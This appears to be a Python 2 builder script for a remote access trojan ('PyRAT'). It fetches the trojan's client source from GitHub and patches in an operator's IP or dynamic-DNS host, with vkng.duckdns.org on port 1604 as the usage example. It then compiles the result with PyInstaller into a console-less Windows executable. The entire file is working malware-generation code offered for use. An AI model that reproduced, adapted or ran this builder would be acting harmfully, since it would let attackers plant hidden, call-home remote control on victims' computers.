#!/usr/bin/env python2
# -*- coding: utf-8 -*-
#
#

"""
[~] Author : Black Viking
"""

import sys, os, subprocess, urllib2, colorama

def get_client(host, port, host_type):
	if host_type == "-ip":
		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = '%s'"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))
	else:
		return urllib2.urlopen("https://raw.githubusercontent.com/blackvkng/PyRAT/master/client.py").read().replace("HOST = '127.0.0.1'", "HOST = socket.gethostbyname('%s')"%(host)).replace("PORT = int('8000')", "PORT = int('%s')"%(port))

def usage():
	print """
Usage:
----------------------
	python2 generate_exec.py -ip 127.0.0.1 -p 8080       #for an ip adress
	python2 generate_exec.py -h vkng.duckdns.org -p 1604 #for a dns adress\n"""
	sys.exit()
	
def generate_exec(host, port, source):
	print """
[-] Host: %s
[-] Port: %s\n"""%(host, port)
	
	file = open("template.py", "w")
	file.write(source)
	file.close()

	command = subprocess.Popen("pyinstaller --onefile --noconsole template.py", shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        data = command.stdout.read() + command.stderr.read()
	os.remove("template.py")
	file = open("%s%slog.txt"%(os.getcwd(), os.sep), "w")
	file.write(data)
	file.close()
	if os.path.exists("%s%sdist%stemplate.exe"%(os.getcwd(), os.sep, os.sep)) == True:
                print "[+] Exe file (Windows) ==> %s"%(os.getcwd()+os.sep+"dist"+os.sep+"template.exe")
		print "[+] See log file ==> %s"%(os.getcwd()+os.sep+"log.txt")
	else:
		print "[+] See log file ==> %s"%(os.getcwd()+os.sep+"log.txt")

def main():
	if len(sys.argv) == 5:
		if os.path.exists("exec") == True:
			os.chdir("exec")
		else:
			os.mkdir("exec")
			os.chdir("exec")

		host_type = sys.argv[1]
		host = sys.argv[2]	
		port = sys.argv[4]
		if host_type == "-ip":
			source = get_client(host, port, host_type)

		elif host_type == "-h":
			source = get_client(host, port, host_type)

		else:
			usage()

		generate_exec(host, port, source)

	else:
		usage()

if __name__ == "__main__":
	main()
